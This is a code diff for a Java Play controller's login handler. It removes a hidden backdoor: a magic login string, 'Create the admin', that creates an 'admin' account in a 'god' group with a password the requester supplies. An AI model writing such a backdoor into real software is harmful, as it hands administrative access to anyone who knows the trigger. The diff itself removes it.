@@ -23,23 +23,6 @@ public class Secure extends Controller {
     public static Result logInProc() {
         DynamicForm requestData = Form.form().bindFromRequest();
 
-        if (requestData.get("userLogin").equals("Create the admin")) {
-            models.User useradmin = new models.User();
-            useradmin.setUserFirstName("Сэр");
-            useradmin.setUserLastName("Босс");
-            useradmin.setUserLogin("admin");
-            useradmin.setUserPass(requestData.get("userPass"));
-            useradmin.setUserStatus(true);
-            useradmin.setUserGroup("god");
-            useradmin.setUserReg(new java.util.Date ());
-            try {
-                useradmin.save();
-                return ok(auth.render("Аккаунт 'admin' с указанным паролем создан. Добро пожаловать в систему!"));
-            } catch (Exception e) {
-                return badRequest(auth.render("Не балуйся!"));
-            }
-        }
-
         List<User> userList = User.find.where()
                 .ilike("userLogin", requestData.get("userLogin"))
                 .findList();
